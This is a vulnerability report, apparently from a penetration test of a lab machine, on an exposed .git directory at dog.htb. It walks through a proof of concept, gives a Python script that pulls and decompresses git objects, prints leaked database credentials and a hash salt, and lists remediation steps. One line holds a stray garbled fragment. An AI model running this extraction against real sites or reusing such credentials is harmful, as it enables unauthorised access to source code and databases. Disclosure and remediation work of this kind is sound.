# Exposed .git Directory Leading to Source Code and Credential Disclosure

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-02-24 12:37:58 UTC
**Target:** http://dog.htb/.git/
**CWE:** CWE-200
**CVSS:** 9.3

## Description

The target web application exposes its entire .git repository at http://dog.htb/.git/. This allows an attacker to reconstruct the complete source code, configuration files, and version history without authentication. The repository contained a Backdrop CMS installation with sensitive configuration data including database credentials and cryptographic salts.

## Impact

Full source code disclosure reveals application architecture, business logic, and implementation details. Database credentials (root:BackDropJ2024DS2024) were extracted from settings.php, enabling potential database compromise. The hash salt used for password hashing was also disclosed, weakening credential security. An attacker can identify additional vulnerabilities, backdoors, or sensitive internal information from the codebase.

## Technical Analysis

The .git directory was accessible via HTTP without authentication. Standard Git object storage (loose objects) was used. By manually fetching objects via curl/wget and decompressing them, the complete repository was reconstructed including:
- Core application files (index.php, settings.php, update.php, install.php)
- Module and theme directories
- Database configuration with credentials: mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop
- Hash salt: aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ
- Backdrop CMS 1.x codebase

The exposure enables complete code review and identification of additional security issues.

## Proof of Concept

1. Access http://dog.htb/.git/HEAD to identify the current branch
2. Retrieve .git/config to determine repository structure
3. Fetch commit objects from .git/objects/[2-char prefix]/[full-hash]
4. Decompress using zlib to extract tree and blob objects
5. Recursively traverse tree objects to reconstruct all files
6. Extract settings.php to obtain database credentials and configuration

Alternatively, use automated tools like git-dumper or伏 toggle custom scripts to extract the repository.

```
#!/usr/bin/env python3
"""Exploit for exposed .git directory"""

import requests
import zlib
import os
import re

TARGET = "http://dog.htb"
GIT_DIR = f"{TARGET}/.git"

def get_object(hash_prefix, hash_suffix):
    """Fetch and decompress a git object"""
    url = f"{GIT_DIR}/objects/{hash_prefix}/{hash_suffix}"
    resp = requests.get(url)
    if resp.status_code == 200:
        try:
            decompressed = zlib.decompress(resp.content)
            return decompressed
        except:
            return None
    return None

# Example: Extract HEAD to get commit hash
head = requests.get(f"{GIT_DIR}/HEAD").text.strip()
if head.startswith('ref:'):
    ref = head.split(' ')[1]
    ref_path = f"{GIT_DIR}/{ref}"
    commit_hash = requests.get(ref_path).text.strip()
    print(f"Commit hash: {commit_hash}")
    
    # Get commit object
    commit_obj = get_object(commit_hash[:2], commit_hash[2:])
    if commit_obj:
        print(f"Commit object:\n{commit_obj.decode('utf-8', errors='ignore')[:500]}")
```

## Remediation

1. Remove .git directory from web-accessible locations immediately
2. Configure web server to deny access to .git/ and other VCS directories (e.g., .svn, .hg)
3. Deploy applications using production builds without version control metadata
4. Use .gitignore to exclude sensitive files from repository (though they should not be in web root anyway)
5. Regularly audit web root for exposed configuration files and VCS directories
6. Implement proper file permissions to prevent unauthorized access
